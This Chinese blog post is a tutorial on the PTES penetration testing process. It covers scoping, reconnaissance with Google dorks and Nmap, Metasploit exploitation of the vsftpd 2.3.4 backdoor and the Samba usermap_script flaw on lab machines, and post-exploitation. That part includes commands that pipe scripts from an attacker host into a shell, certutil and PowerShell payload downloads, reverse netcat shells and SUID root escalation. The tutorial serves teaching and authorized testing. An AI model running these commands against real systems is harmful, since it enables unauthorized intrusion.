---
layout: post
title: 渗透测试基本流程
tag: 渗透
---

# 基于PTES标准的深度技术与流程解析

## 1. 现代网络安全与渗透测试执行标准 (PTES) 概论

在数字化转型加速的今天，企业面临的网络安全威胁日益复杂，从勒索软件到高级持续性威胁（APT），攻击手段层出不穷。为了验证防御体系的有效性，渗透测试（Penetration Testing）已成为组织安全策略中不可或缺的一环。这不仅仅是一次简单的漏洞扫描或脚本运行，而是一场经过严密策划、获得合法授权的模拟网络战。为了确保测试的专业性、系统性和标准化，安全业界广泛采用了 **渗透测试执行标准 (Penetration Testing Execution Standard, PTES)**。这一标准不仅定义了测试的技术深度，更规范了从商业交互到技术实施的全生命周期管理 1。

PTES 标准的核心价值在于它提供了一种结构化的方法论，将看似混乱的黑客攻击过程拆解为七个逻辑严密、相互关联的阶段：前期交互（Pre-engagement Interactions）、情报搜集（Intelligence Gathering）、威胁建模（Threat Modeling）、漏洞分析（Vulnerability Analysis）、漏洞利用（Exploitation）、后渗透测试（Post-Exploitation）以及报告撰写（Reporting）4。这种分层架构确保了测试团队能够覆盖攻击链的每一个环节，不仅关注单一的技术漏洞，更关注漏洞组合后对业务造成的实际冲击。

与 ISO 27001、PCI DSS、HIPAA 或 GDPR 等合规性框架相比，PTES 更侧重于实战操作的技术细节，但其最终产出的报告能够与这些合规标准进行映射，帮助企业在满足监管要求的同时，真实地提升安全防御态势 1。本报告将站在高级安全顾问的视角，依据 PTES 标准的七大阶段，结合 Metasploit、Nmap 等行业标准工具，深入剖析渗透测试的完整流程、技术原理及实战技巧，旨在为安全从业者提供一份详尽的、具备可操作性的实战指南。

## 2. 第一阶段：前期交互 (Pre-engagement Interactions) —— 确立信任与边界

前期交互阶段是整个渗透测试项目的基石，它不仅涉及商业合同的签署，更关乎法律合规、风险控制与测试目标的精准对齐。在这一阶段，测试团队需与客户进行深入沟通，将模糊的安全需求转化为具体的技术指标和行为准则 1。

### 2.1 范围界定 (Scoping) 的战略意义

范围界定（Scoping）是前期交互中最关键的环节，它直接决定了测试的广度与深度。通过明确“测试范围（In-Scope）”与“非测试范围（Out-of-Scope）”，双方能够有效规避法律风险并优化资源配置 6。

在实战中，范围界定通常涉及对目标资产属性的精细划分。例如，客户可能指定特定的 IP 地址段、域名、API 端点或移动应用程序作为测试目标。测试团队需要确认这些资产的归属权，特别是在涉及云服务提供商（如 AWS、Azure）或第三方托管服务时，必须确保测试行为符合服务提供商的使用条款 5。此外，对于生产环境中的关键业务系统（Critical Business Systems），范围界定还需考虑到测试可能带来的业务中断风险，从而决定是否需要建立独立的测试环境或在非业务高峰期进行。

根据掌握信息的程度，测试类型通常被划分为三类，每种类型对范围界定的要求略有不同：

- **黑盒测试 (Black Box)**：模拟外部攻击者，测试团队对目标系统一无所知。这种模式下，范围界定往往较为宽泛，重点在于发现外部暴露面的未知风险。
- **白盒测试 (White Box)**：测试团队拥有完整的系统信息，包括源代码、网络拓扑、账户凭证等。这种模式通常针对特定应用或系统进行深度审计，范围界定极为精确，旨在挖掘深层次的逻辑漏洞。
- **灰盒测试 (Gray Box)**：介于两者之间，测试团队可能拥有部分权限（如普通用户账号）。这种模式常用于模拟内部威胁或已被攻陷的账户，范围界定需明确权限边界 7。

### 2.2 交互规则 (Rules of Engagement, RoE) 的制定

如果说范围界定划定了“打哪里”，那么交互规则（RoE）则规定了“怎么打”。RoE 是测试团队与客户之间达成的技术与伦理契约，必须以书面形式详细记录 5。

一份完善的 RoE 文档应包含以下核心要素：

- **时间窗口**：明确允许进行测试的具体日期和时间段，以最大限度地减少对客户正常业务运营的干扰。例如，高强度的扫描或漏洞利用可能被限制在夜间或周末进行。
- **攻击类型限制**：明确禁止的攻击手段。例如，大多数客户会明确禁止拒绝服务（DoS）攻击，以防止业务瘫痪；社会工程学攻击（Social Engineering）是否在许可范围内也需特别注明，因为这涉及员工隐私和公司文化 6。
- **紧急联络机制**：建立 24/7 的紧急沟通渠道。当测试团队发现极高危漏洞（如核心数据库泄露）或误触导致系统不稳时，能够立即通知客户方的技术接口人。
- **证据留存与数据处理**：规定如何安全地存储测试过程中获取的敏感数据，以及测试结束后如何销毁这些数据，以符合 GDPR 等隐私法规的要求 1。

通过严谨的前期交互，渗透测试不再是一场无序的破坏活动，而是一项受控的、旨在提升价值的风险评估过程。

## 3. 第二阶段：情报搜集 (Intelligence Gathering) —— 攻击面的测绘与分析

情报搜集，又称为侦察（Reconnaissance），是渗透测试中耗时最长但也最具价值的阶段。正如孙子兵法所云“知己知彼，百战不殆”，在这一阶段，测试者试图搜集关于目标的一切可用信息。情报的质量直接决定了后续威胁建模的准确性和攻击路径的有效性 1。根据与目标系统的交互程度，情报搜集通常分为被动侦察和主动侦察。

### 3.1 被动情报搜集 (Passive Reconnaissance)

被动侦察的核心原则是“零接触”。测试者仅利用公开可用的资源（Open Source Intelligence, OSINT）进行查询，不向目标系统发送任何探测数据包，因此几乎不可能被目标的入侵检测系统（IDS）或防火墙察觉 8。

#### 3.1.1 Google Hacking (Google Dorks) 的深层应用

搜索引擎是巨大的信息宝库。Google Hacking，或称为 Google Dorking，是指利用搜索引擎的高级操作符来挖掘由于配置错误或无意泄露而暴露在互联网上的敏感信息 10。通过精心构造的搜索语句（Dorks），测试者可以发现后台登录入口、配置文件、日志文件甚至包含密码的文档。

下表详细列举了核心的 Google Dorks 操作符及其在渗透测试中的具体应用场景 10：

| **操作符**           | **语法示例**                | **深度解析与实战应用**                                       |
| -------------------- | --------------------------- | ------------------------------------------------------------ |
| `site:`              | `site:target.com`           | 将搜索结果严格限制在目标域名及其子域名内。这是所有高级搜索的基础，用于构建针对特定目标的搜索上下文。 |
| `filetype:` / `ext:` | `filetype:pdf` 或 `ext:log` | 筛选特定文件扩展名。在实战中，结合 `site:target.com ext:sql` 可以查找无意暴露的数据库备份文件；`ext:config` 或 `ext:xml` 常用于发现包含硬编码凭证的配置文件。 |
| `inurl:`             | `inurl:login.php`           | 搜索 URL 中包含特定关键词的页面。这是发现管理后台（admin panel）、特定服务接口（如 `inurl:wp-admin`）的利器。 |
| `intitle:`           | `intitle:"index of /"`      | 搜索网页标题中包含特定关键词的页面。`"index of /"` 是典型的目录遍历（Directory Listing）特征，利用此 Dork 可以快速发现服务器配置不当导致的目录浏览漏洞，进而下载敏感文件。 |
| `intext:`            | `intext:"password"`         | 搜索网页正文中包含特定关键词的页面。结合 `filetype:log intext:"password"`，测试者可以查找记录了用户凭证的日志文件。 |
| `cache:`             | `cache:target.com`          | 查看 Google 索引中存储的网页快照。当目标页面已被管理员删除或修改时，快照可能包含原始的敏感信息，且访问快照不会向目标服务器发送请求，隐蔽性极高。 |

**实战洞察**：在 2025 年的渗透测试实践中，Google Dorks 依然威力不减。例如，搜索 `site:target.com ext:env` 可以直接暴露现代 Web 应用（如基于 Docker 或 Laravel 框架的应用）的环境变量文件，其中往往包含数据库连接字符串和 API 密钥。

#### 3.1.2 自动化 OSINT 工具：TheHarvester

为了提高效率，渗透测试者通常使用自动化工具来聚合多个 OSINT 数据源。**TheHarvester** 是一款专为收集电子邮件账户、子域名、主机名、员工姓名和开放端口而设计的 Python 工具 15。它能够查询 Google、Bing、LinkedIn、Shodan 等多个公共数据源。

工具使用详解：

在 Kali Linux 环境中，TheHarvester 的典型使用命令如下：

```bash
theHarvester -d kali.org -l 500 -b google,linkedin,bing
```

- `-d`: 指定目标域名（Domain）。
- `-l`: 限制每个数据源返回的结果数量（Limit），设置为 500 可确保覆盖面。
- `-b`: 指定后端数据源（Backends），如 `google`、`linkedin`、`bing` 或 `all`。

数据价值分析：

通过 TheHarvester 收集到的电子邮件地址列表是后续社会工程学攻击（如钓鱼邮件）的基础素材。同时，通过 LinkedIn 收集到的员工职位信息可以帮助构建组织架构图，识别高权限目标（如系统管理员或开发运维人员）。

### 3.2 主动情报搜集 (Active Reconnaissance)

主动侦察涉及直接与目标系统进行网络交互，这会产生流量并可能被安全设备记录。此阶段的目标是绘制目标的网络拓扑，发现存活主机及其开放的服务 6。

#### 3.2.1 子域名枚举与基础设施测绘

子域名往往是企业安全防线的薄弱环节。主域名（如 `www.target.com`）通常防护严密，但开发测试环境（如 `dev.target.com`）、旧版系统（`legacy.target.com`）或第三方集成入口可能存在未修补的漏洞。

**Sublist3r** 是进行子域名枚举的行业标准工具之一。它基于 Python 开发，能够通过查询 Baidu, Yahoo, Google, Bing, Ask, Netcraft, DNSdumpster, VirusTotal, ThreatCrowd 等多个搜索引擎和公开数据库来枚举子域名 17。

**实战命令与参数解析**：

```bash
python3 sublist3r.py -d example.com -t 10 -v -o subdomains.txt
```

- `-d`: 目标域名。
- `-t`: 线程数（Threads），增加线程数可加快枚举速度。
- `-v`: 详细模式（Verbose），实时显示发现的结果。
- `-o`: 将结果输出到文件，便于后续导入 Nmap 进行扫描。

除了 Sublist3r，**Netcraft** 和 **VirusTotal** 等在线平台也提供了丰富的历史 DNS 数据，可以揭示目标基础设施的演变过程。例如，通过 DNSdumpster 可以可视化地查看域名的 DNS 解析记录（A 记录、MX 记录、TXT 记录等），从而推断目标的网络架构（如是否使用了 CDN、邮件网关位置等）。

## 4. 第三阶段与第四阶段：威胁建模与漏洞分析 —— 从数据到风险的转化

在完成情报搜集后，测试者面对的是海量的原始数据。接下来的两个阶段——威胁建模与漏洞分析，旨在将这些数据转化为可执行的攻击计划 1。

### 4.1 威胁建模 (Threat Modeling)

威胁建模是对收集到的情报进行战略分析的过程。它要求测试者像真正的攻击者一样思考，分析哪些资产对业务最重要，以及通过何种路径可以触达这些资产 5。

攻击面映射 (Attack Surface Mapping)：

测试者需要识别所有可能的攻击入口。例如，通过 TheHarvester 发现的 VPN 入口可能成为凭证撞库的目标；通过 Sublist3r 发现的 test.target.com 可能运行着含有调试信息的应用。威胁建模的核心在于优先级排序——确定哪条攻击路径最具可行性且收益最大。

### 4.2 漏洞分析 (Vulnerability Analysis)

漏洞分析是技术层面的核心环节，旨在发现系统中存在的具体安全缺陷。这一阶段高度依赖于端口扫描和服务指纹识别，**Nmap (Network Mapper)** 无疑是该领域的王者 20。

#### 4.2.1 Nmap 扫描策略与技术深度解析

Nmap 的强大之处在于其灵活性。针对不同的网络环境和探测需求，测试者需要采用不同的扫描策略 25。

1. 主机发现 (Ping Scan) —— 存活探测

在扫描端口之前，首先需要确定哪些主机是在线的。

```bash
nmap -sn 192.168.1.0/24
```

- `-sn`: 仅进行主机发现，不进行端口扫描（旧版本为 `-sP`）。Nmap 会发送 ICMP Echo 请求、TCP SYN 到 443 端口、TCP ACK 到 80 端口以及 ICMP Timestamp 请求。只要收到任何一种响应，即判定主机存活。这种策略能有效发现防火墙后仍暴露部分服务的主机。

**2. 端口扫描技术 —— SYN 扫描 vs. Connect 扫描**

- **TCP SYN 扫描 (-sS)**：这是默认且最常用的扫描方式，被称为“半开放扫描”。
  - **原理**：测试者发送一个 SYN 包（建立连接请求）。
    - 若收到 **SYN/ACK**：端口开放。测试者随后发送 RST（复位）断开连接，不完成三次握手。
    - 若收到 **RST**：端口关闭。
    - 若无响应：端口被过滤（Filtered）。
  - **优势**：速度快，且由于未建立完整连接，通常不会在应用层日志中留下记录，隐蔽性较好。
  - **命令**：`nmap -sS target`
- **TCP Connect 扫描 (-sT)**：当测试者没有原始套接字权限（非 root 用户）时使用。
  - **原理**：完成完整的 TCP 三次握手（SYN -> SYN/ACK -> ACK）。
  - **劣势**：速度较慢，且会在目标系统日志中留下明显的连接记录，容易被检测。
- 服务版本与操作系统探测 (-sV, -O)

仅仅知道端口 80 开放是不够的，测试者需要知道运行的是 Apache 2.4.49 还是 Nginx 1.18.0，因为特定版本的漏洞利用代码截然不同。

```bash
nmap -sV -O -p 80,443 target
```

- `-sV`: 版本探测。Nmap 发送一系列复杂的探针包，通过分析响应的指纹信息来比对服务版本数据库。
- `-O`: 操作系统探测。通过分析 TCP/IP 协议栈的细微实现差异（如 TTL 值、窗口大小、ISN 生成规律）来猜测操作系统类型。
- 综合扫描与脚本引擎 (-A, --script)

为了获取最全面的信息，通常使用综合扫描选项。

```bash
nmap -A -T4 target
```

- `-A`: 启用操作系统探测、版本探测、脚本扫描（Script Scanning）和路由追踪（Traceroute）。
- `-T4`: 计时模板。Nmap 提供 T0（最慢，规避 IDS）到 T5（最快）六个模板。T4 是推荐的平衡点，既保证速度又兼顾准确性。

**Nmap Scripting Engine (NSE)** 是 Nmap 的杀手锏，允许用户使用 Lua 脚本执行高级任务。

- `--script vuln`: 自动检测常见漏洞（如 MS17-010 EternalBlue）。
- `--script ftp-anon`: 检查 FTP 服务是否允许匿名登录。

#### 4.2.2 漏洞库搜索：SearchSploit

当 Nmap 确认了服务版本（例如 `vsftpd 2.3.4`）后，下一步是查询该版本是否存在公开的利用代码。**Exploit-DB** 是全球最大的漏洞利用代码归档库，而 **SearchSploit** 是其离线命令行搜索工具 29。

**实战操作流程**：

1. **搜索漏洞**：

   ```bash
   searchsploit vsftpd 2.3.4
   ```

   输出将显示相关的 Exploit 标题和路径。

2. 详细信息与复制：

   如果发现了感兴趣的 Exploit（例如 ID 为 17491），可以使用以下命令将其复制到当前目录进行分析：

   ```bash
   searchsploit -m 17491
   ```

   或者查看其内容：

   ```bash
   searchsploit -x 17491
   ```

深度分析：

漏洞分析阶段需要极高的严谨性。仅仅因为 SearchSploit 返回了结果，并不意味着漏洞一定存在。管理员可能虽然使用了旧版本软件，但已应用了安全补丁（Backporting），或者通过配置禁用了受影响的功能。因此，在进入下一阶段前，验证（Verification）是必不可少的，这通常通过发送无害的验证数据包（Proof of Concept, PoC）来实现。

## 5. 第五阶段：漏洞利用 (Exploitation) —— 突破防线

漏洞利用阶段是渗透测试的高潮，测试者通过执行特定的代码（Exploit）来利用前一阶段发现的漏洞，从而绕过安全机制，获取对目标系统的控制权。这一阶段不仅需要技术能力，更需要谨慎操作，以避免导致目标系统崩溃 1。我们将以业界标杆工具 **Metasploit Framework (MSF)** 为核心，结合具体的实战场景进行深度解析。

### 5.1 Metasploit Framework (MSF) 架构与实战方法论

Metasploit 是一个功能庞大的渗透测试框架，它将攻击过程模块化，使得复杂的攻击变得标准化和可重复。理解其核心架构对于高效使用至关重要 33。

**核心模块解析**：

- **Exploits（利用模块）**：这是攻击的“弹头”，是一段利用特定漏洞（如缓冲区溢出、SQL 注入）的代码。
- **Payloads（载荷模块）**：这是攻击的“战斗部”，是漏洞利用成功后在目标系统上执行的代码。常见的 Payload 包括：
  - `shell_reverse_tcp`: 反弹一个基本的命令行 Shell。
  - `meterpreter`: 一个高级的、驻留在内存中的动态 Payload，提供截屏、键盘记录、文件传输等强大功能，且极难被杀毒软件检测。
- **Auxiliary（辅助模块）**：用于扫描、嗅探、指纹识别等，不直接获取 Shell，但在侦察和后渗透阶段非常有用。
- **Encoders（编码模块）**：用于对 Payload 进行编码（如 Shikata Ga Nai 编码），以改变其特征码，试图绕过防病毒软件的检测。

**MSFConsole 实战工作流**：

1. **启动与搜索**：

   ```bash
   msfconsole
   msf6 > search <漏洞关键词>
   ```

2. **选择模块**：

   ```bash
   msf6 > use <模块路径>
   ```

3. 配置参数：

   通过 show options 查看所需参数。核心参数通常包括：

   - `RHOSTS` (Remote Hosts): 目标 IP 地址。
   - `LHOST` (Local Host): 攻击机 IP 地址，用于接收反弹连接。
   - `LPORT`: 监听端口。

4. **执行攻击**：

   ```bash
   msf6 > exploit
   ```

### 5.2 实战场景 I：VSFTPD v2.3.4 后门利用 (Metasploitable 2)

**场景背景**：VSFTPD (Very Secure FTP Daemon) 是一款广泛使用的 FTP 服务器软件。然而，在 2011 年，有人向其源代码中植入了一个恶意后门。特定版本的 VSFTPD (2.3.4) 包含一个逻辑炸弹：如果在用户名字段中输入包含笑脸符号 `:)` 的字符串，服务器将在 TCP 6200 端口通过 `root` 权限开启一个监听 Shell 38。这个案例是理解“供应链攻击”和“后门漏洞”的经典教材。

**利用步骤详解**：

1. 确认目标与服务：

   通过 Nmap 扫描确认目标运行着受影响版本。

   ```bash
   nmap -p 21 -sV 192.168.1.10
   # 输出确认: vsftpd 2.3.4
   ```

2. **加载 MSF 模块**：

   ```bash
   msfconsole
   msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
   ```

3. **配置与验证**：

   ```bash
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.10
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
   ```

   *注意：此模块通常不需要设置 Payload，因为它直接连接后门端口 6200。*

4. **触发攻击**：

   ```bash
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
   ```

   若成功，控制台将显示 `Command shell session 1 opened`。此时输入 `id` 或 `whoami`，系统应返回 `uid=0(root)`，标志着最高权限的获取。

手动利用（原理验证）：

为了深入理解漏洞机理，我们可以不使用 Metasploit，而是通过 Netcat 手动触发 38：

1. **触发后门**：

   ```bash
   telnet 192.168.1.10 21
   # 输入用户名，必须包含 :)
   user hacker:)
   pass password123
   ```

   此时连接可能会挂起，这是正常的。

2. 连接后门端口：

   打开一个新的终端窗口，连接目标的 6200 端口：

   ```bash
   nc -v 192.168.1.10 6200
   ```

   连接成功后，直接输入命令即可执行。

### 5.3 实战场景 II：Samba 用户名映射脚本漏洞 (Hack The Box - Lame)

**场景背景**：Samba 是 Linux/Unix 系统上实现 SMB 协议的软件，用于文件共享。在 CVE-2007-2447 中，Samba 允许在 `username map script` 配置项中执行 shell 命令。如果攻击者发送特定的用户名请求，Samba 会在未过滤的情况下将其传递给 `/bin/sh` 执行，从而导致远程命令执行（RCE） 42。

**利用步骤详解**：

1. 情报确认：

   Nmap 扫描显示端口 139/445 开放，Samba 版本在 3.0.20 到 3.0.25rc3 之间。

2. **MSF 模块配置**：

   ```bash
   msf6 > search usermap_script
   msf6 > use exploit/multi/samba/usermap_script
   msf6 exploit(multi/samba/usermap_script) > set RHOSTS <Target_IP>
   msf6 exploit(multi/samba/usermap_script) > set LHOST <Attacker_IP>
   ```

3. Payload 选择与执行：

   这里我们显式指定一个反弹 Netcat 的 Payload，以增加稳定性：

   ```bash
   msf6 exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat
   msf6 exploit(multi/samba/usermap_script) > exploit
   ```

   攻击成功后，同样会获得一个 root 权限的 Shell。

## 6. 第六阶段：后渗透测试 (Post-Exploitation) —— 价值证明与持久化

获取初始 Shell 仅仅是渗透测试的中场。后渗透阶段的目标是评估攻击对业务的实际影响范围。这包括稳固现有访问权限、提升权限以获取敏感数据、横向移动到其他高价值目标，以及清理痕迹 1。

### 6.1 Shell 升级技术：从 Dumb Shell 到交互式 TTY

通过 Netcat 或某些 Exploit 获得的 Shell 通常是“非交互式”的（Dumb Shell）。这种 Shell 功能受限：不支持 `su` 或 `sudo` 交互输入密码，不支持 Tab 键命令补全，不支持 Vim 等全屏编辑器，甚至按下 `Ctrl+C` 会直接断开连接而非终止当前进程。为了进行后续操作，必须将其升级为全交互式 TTY 45。

**Python PTY 升级法（标准流程）**：

1. 生成伪终端：

   在受害者 Shell 中输入以下命令，利用 Python 的 pty 模块生成一个伪终端：

   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```

   （如果目标仅有 Python 2，则使用 `python`）。此时 Shell 看起来稍微正常了一些，但仍未完全交互。

2. 挂起与本地配置：

   按下 Ctrl + Z 将当前 Shell 挂起到后台。

   在攻击者本机终端输入：

   ```bash
   stty raw -echo; fg
   ```

   - `stty raw`: 将本地终端设置为原始模式，不处理输入（如 Ctrl+C），而是直接透传给远端。
   - `-echo`: 关闭回显，避免输入两次显示。
   - `fg`: 将后台挂起的 Shell 调回前台。

3. 重置与环境变量设置：

   回到 Shell 后，输入 reset 并回车，初始化终端状态。

   最后设置环境变量以解决显示错位问题：

   ```bash
   export TERM=xterm
   export SHELL=bash
   ```

   至此，你拥有了一个功能完备的交互式 Shell，可以自如地运行 sudo、vim 和 ssh。

### 6.2 提权 (Privilege Escalation)：向皇冠宝石进发

如果初始 Shell 仅有普通用户权限（如 `www-data`），测试者需要寻找途径提升至 `root` (Linux) 或 `SYSTEM` (Windows) 权限，这一过程称为提权。

#### 6.2.1 自动化枚举工具：PEASS-ng

**PEASS (Privilege Escalation Awesome Scripts SUITE)** 是目前最全面、最流行的提权枚举工具套件。它能够快速扫描系统中的潜在提权路径 49。

- LinPEAS (Linux Privilege Escalation Awesome Script)：

  LinPEAS 会检查内核漏洞（如 Dirty COW）、SUID 文件、sudo 权限配置错误、Cron 定时任务、明文存储的密码、弱权限文件等。

  实战技巧：通常攻击者会在本地搭建 Web 服务器托管脚本，然后在目标机上直接内存执行，避免落地文件被发现：

  ```bash
  # 攻击机
  python3 -m http.server 80
  # 目标机
  curl http://<Attacker_IP>/linpeas.sh | sh
  ```

  输出结果中，红色加粗的文本通常表示极高概率的提权向量。

- WinPEAS (Windows Privilege Escalation Awesome Script)：

  针对 Windows 环境，检查未打补丁的漏洞（如 Potato 系列漏洞）、AlwaysInstallElevated 注册表项、不安全的服务权限、存储在注册表中的凭证等。

  命令：winPEASx64.exe

#### 6.2.2 常见提权向量解析

- **SUID 提权**：在 Linux 中，如果 `/usr/bin/find` 等程序被设置了 SUID 位，且属主为 root，普通用户可以通过该程序以 root 身份执行命令：`find. -exec /bin/sh -p \; -quit`。
- **内核漏洞**：如 Dirty Pipe (CVE-2022-0847) 或 PwnKit (CVE-2021-4034)，允许普通用户覆盖只读文件或执行任意代码。

### 6.3 文件传输技术 (File Transfers)：离地攻击的艺术

在后渗透阶段，攻击者需要将提权脚本、枚举工具或数据在攻击机与目标机之间传输。由于目标环境可能受到严格监控，利用系统原生工具（Living off the Land Binaries, LOLBins）进行传输是首选策略 54。

#### 6.3.1 Windows 环境下的传输技巧

1. Certutil —— 被滥用的证书工具

Certutil.exe 是 Windows 用于管理证书的合法工具，但其下载 URL 内容并保存到本地的功能常被攻击者滥用 59。

```DOS
certutil.exe -urlcache -split -f http://<Attacker_IP>/nc.exe c:\temp\nc.exe
```

- **风险提示**：由于此技术过于泛滥，现代 EDR（如 Defender for Endpoint）和 SIEM 系统（如 Splunk）均有针对 `certutil` 下载行为的检测规则。在受监控环境中应谨慎使用。
- PowerShell 下载技术

PowerShell 提供了多种下载方式，灵活性极高。

- **Invoke-WebRequest (iwr)**：这是 PowerShell 3.0+ 的内置 cmdlet，语法简洁 63。

  ```powershell
  Invoke-WebRequest -Uri "http://<Attacker_IP>/winPEAS.exe" -OutFile "C:\temp\winPEAS.exe"
  ```

- **System.Net.WebClient**：这是一种基于.NET 框架的方法，兼容性更好，且不依赖 Internet Explorer 的首次运行配置 66。

  ```powershell
  (New-Object System.Net.WebClient).DownloadFile('http://<Attacker_IP>/file.exe', 'C:\temp\file.exe')
  ```

  为了绕过基于 User-Agent 的过滤，攻击者还可以自定义 User-Agent 头：

  ```powershell
  $wc = New-Object System.Net.WebClient
  $wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...'
  $wc.DownloadFile($url, $output)
  ```

#### 6.3.2 Linux 环境与攻击机服务搭建

**1. Linux 下载工具**

- **Wget** ： `wget http://<Attacker_IP>/linpeas.sh -O /tmp/linpeas.sh` 
- **卷曲** ： `curl http://<Attacker_IP>/linpeas.sh -o /tmp/linpeas.sh` 
- 攻击机搭建临时 HTTP 服务器

Python 是最快速搭建文件服务器的方式，用于向目标提供文件下载 69。

- **Python 3（推荐）** ：

  ```bash
  python3 -m http.server 8000
  ```

  此命令会在 8000 端口开启 Web 服务，根目录为当前文件夹。

- **Python 2（旧版）** ：

  ```bash
  python -m SimpleHTTPServer 8000
  ```

  *注意*：如果需要使用 80 端口（规避防火墙出站限制），必须使用 `sudo` 权限运行。

## 7. 第七阶段：报告撰写 (Reporting) —— 沟通价值的桥梁

渗透测试的最终交付物不是 Shell，而是一份详尽、清晰、专业的报告。报告不仅要告诉客户“哪里坏了”，更要解释“坏得多严重”以及“如何修好” 1。

### 7.1 报告的核心结构

一份标准的渗透测试报告应包含以下两个主要部分：

1. 执行摘要 (Executive Summary) 75

这是报告中最重要的部分，主要受众是 C-Level 高管（CEO/CTO/CISO）。

- **非技术语言**：避免使用堆溢出、SQL 注入等技术术语，转而使用“数据泄露风险”、“未授权访问”等业务语言。
- **业务影响分析**：清晰阐述发现的漏洞对业务连续性、品牌声誉、财务状况和合规性（如 GDPR/PCI-DSS）的具体影响。
- **风险概览可视化**：使用饼图或柱状图展示高、中、低危漏洞的数量分布。
- **战略性建议**：提供宏观的修复方向，如“加强员工安全意识培训”、“实施多因素认证（MFA）”、“改进补丁管理流程”。
- 技术细节 (Technical Findings) 74

这部分针对 IT 技术团队和开发人员，要求极其详尽。

- **漏洞详情**：包含漏洞名称、CVE 编号、CVSS 评分。
- **复现步骤 (Proof of Concept, PoC)**：这是最具技术价值的部分。必须提供详细的截图、代码片段和操作步骤，确保客户的技术人员能够复现该漏洞，验证其真实性。
- **受影响资产**：列出具体的 IP、URL、参数或端口。
- **修复建议 (Remediation)**：提供具体的修复代码、配置修改建议或补丁下载链接，并给出验证修复的方法。

### 7.2 风险评估矩阵

在报告中，风险等级不应仅仅基于 CVSS 评分，还应结合业务上下文。

- **风险 = 可能性 (Likelihood) × 影响 (Impact)**
- 例如，一个位于内网且无敏感数据的测试服务器上的 RCE 漏洞，其风险等级应低于面向互联网的核心支付网关上的 SQL 注入漏洞，尽管前者的 CVSS 分数可能更高。报告应体现这种差异化的风险评估。

## 8. 结论与未来展望

渗透测试是一项融合了技术深度、战术思维与合规要求的复杂工程。通过遵循 PTES 标准，从细致入微的情报搜集到破坏力巨大的漏洞利用，再到价值导向的报告撰写，安全从业者能够全面评估组织的安全态势。

随着云计算、容器化（Docker/Kubernetes）和零信任架构的普及，未来的渗透测试将面临新的挑战。自动化工具将更加智能，但无法取代人类测试者的逻辑思维；防御检测技术（如 EDR/XDR）的提升要求测试者掌握更隐蔽的免杀与绕过技术。最终，渗透测试将从单一的“找漏洞”演变为持续的“紫队演练”（Purple Teaming），通过攻防双方的实时对抗与协作，共同构建坚不可摧的数字防线。